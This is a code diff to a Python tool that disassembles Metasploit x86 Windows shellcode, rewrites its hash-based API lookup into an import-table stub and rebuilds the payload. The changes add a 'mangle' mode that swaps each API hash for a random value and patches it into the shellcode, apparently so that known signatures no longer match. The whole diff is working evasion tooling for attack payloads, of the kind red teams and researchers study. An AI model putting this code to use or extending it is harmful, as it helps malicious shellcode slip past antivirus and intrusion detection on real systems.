@@ -42,11 +42,14 @@ class x86_windows_metasploit:
 
     '''
     
-    def __init__(self, code):
+    def __init__(self, code, mangle=False):
+        if mangle == 'True': 
+            mangle = True
         self.tracker = []
         self.code = code
         self.arch = CS_ARCH_X86
         self.mode = CS_MODE_32
+        self.mangle =  mangle
         self.comment = "X86 32 (Intel syntax)"
         self.syntax = 0
         self.api_hashes = {}
@@ -187,10 +190,17 @@ class x86_windows_metasploit:
         for ahash in self.hashes:
             if hex(ahash[0]) == anumber:
                 self.called_apis.append(ahash[1])
-                self.api_hashes[ahash[0]] = ahash[1]
-                return ahash[1]
+                # mangle hash here
+                if self.mangle is True:
+                    print('mangle mangle')
+                    random_hash = random.randint(1, 4228250625)
+                    self.api_hashes[random_hash] = ahash[1]
+                    return ahash[1], random_hash # return managed hash here
+                else:
+                    self.api_hashes[ahash[0]] = ahash[1]
+                    return ahash[1], None 
                 
-        return None   
+        return None, None
 
     def get_it_order(self):
         self.replace_string = b''
@@ -203,7 +213,10 @@ class x86_windows_metasploit:
                 self.code = self.code.replace(self.fewerapistub, b'')
                 self.prestine_code = self.code
                 print("metasploit payload:", binascii.hexlify(self.code))
-                
+        else:
+            print("[*] No Hash API stub?? Continuing...")
+            self.prestine_code = self.code
+
         m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
         if m:
             #print(len(m.group()))
@@ -228,6 +241,13 @@ class x86_windows_metasploit:
                 print("InHardCodedFixUp", key, value, offset_to_cmd)
                 offset_to_cmd = b'\x8d\x85' + offset_to_cmd
                 self.prestine_code = re.sub(b'\x8d\x85\xb2\x00\x00\x00', offset_to_cmd, self.prestine_code)
+
+    def fix_up_mangled_hashes(self):
+        for key, value in self.tracker_dict.items():
+
+            if value['hash_update']:
+                print(hex(key),value)
+                self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
 
     def block_tracker(self):
         '''
@@ -262,7 +282,8 @@ class x86_windows_metasploit:
                         # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                         if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
                             print("\tPush EBX:", ebx)
-                            called_api = self.get_hash(ebx)
+                            called_api, newhash = self.get_hash(ebx)
+                            #self.tracker_dict[prior_key]['hash_update'] = newhash
 
                             print("\tCalling Function:", called_api)
                             if called_api == None:
@@ -272,8 +293,11 @@ class x86_windows_metasploit:
                             #    continue
                         elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
                             print("\tPush EBP:", ebp)
-                            called_api = self.get_hash(ebp)
+                            called_api, newhash = self.get_hash(ebp)
+                            self.tracker_dict[prior_key]['hash_update'] = newhash
                             print("\tCalling Function:", called_api)
+                            #if newhash:
+
                             if called_api == None:
                                 continue
                             #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
@@ -285,11 +309,14 @@ class x86_windows_metasploit:
 
                     elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
                         print("[!!] mov ebx")
-                        print(value['mnemonic'], "+", value['op_str'])
-                        if len(value['bytes']) > 2:
+                        print(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
+                        if len(value['bytes']) == 5:
+                            print('right')
                             ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
-                        called_api = self.get_hash(ebx)
-
+                        
+                        #PROBABLY DON'T NEED THIS: TODO
+                        called_api, newhash = self.get_hash(ebx)
+                        self.tracker_dict[key]['hash_update'] = newhash
                         #print(hex(struct.unpack("<I", asm[1:])[0]))
 
                     elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
@@ -299,7 +326,8 @@ class x86_windows_metasploit:
                         # I DON'T THINK I NEED THIS ANYMORE
                         print("\tHardcoded Call")
                         call_op = value['op_str']
-                        called_api = self.get_hash(call_op)
+                        called_api, newhash = self.get_hash(call_op)
+                        self.tracker_dict[key]['hash_update'] = newhash
                         print("\tCalling Function:", called_api)
                         #if buildcode is True:
                         #    self.engine.inspect_block(tmp_block, called_api)
@@ -308,7 +336,8 @@ class x86_windows_metasploit:
                     elif 'jmp' in value['mnemonic']:
                         print('\tA JMP', value['op_str'])
                         call_op = value['op_str']
-                        called_api = self.get_hash(call_op)
+                        called_api, newhash = self.get_hash(call_op)
+                        self.tracker_dict[key]['hash_update'] = newhash
                         print("\tCalling Function:", called_api)
                         #if buildcode is True:
                         #    self.engine.inspect_block(tmp_block, called_api)
@@ -320,7 +349,7 @@ class x86_windows_metasploit:
                     elif 'ret' in value['mnemonic']:
                         print('\tA ret, ending call block')
                         call_op = value['op_str']
-                        called_api = self.get_hash(call_op)
+                        called_api, newhash = self.get_hash(call_op)
                         print("\tCalling Function:", called_api)
                         continue
                         
@@ -375,6 +404,7 @@ class x86_windows_metasploit:
                        'controlFlowTag': None,
                        'blocktag': blocktag,
                        'ebp_offset_update': False,   # True /False
+                       'hash_update': None,          # Populate with the actual value
                        }
                 
                 #if insn.mnemonic == 'int3':
@@ -457,6 +487,10 @@ class x86_windows_metasploit:
         
         print(self.called_apis)
         print("self.api_hashes", self.api_hashes)
+        
+        # replace API hashes with mangled hashes
+        self.fix_up_mangled_hashes()
+
         # make hash table
         
         tmp_bytes = b''
@@ -578,8 +612,7 @@ class x86_windows_metasploit:
         self.jump_stub = b"\xe8"
         self.jump_stub += struct.pack("<I", len(self.IAT_payload) + len(self.stub))
         
-        #look for ebp_offset_update here and update
-
+        #look for ebp_offset_update here
         self.fix_up_hardcoded_offsets()
 
         self.entire_payload = self.jump_stub + self.IAT_payload + self.stub + self.prestine_code
@@ -597,7 +630,7 @@ if __name__ == '__main__':
     #print(sys.stdin.buffer.read())
     incoming_payload = sys.stdin.buffer.read()
     print("Submitted payload length:", len(incoming_payload))
-    test = x86_windows_metasploit(incoming_payload)
+    test = x86_windows_metasploit(incoming_payload, sys.argv[1])
     test.get_it_order()
     test.doit()
 
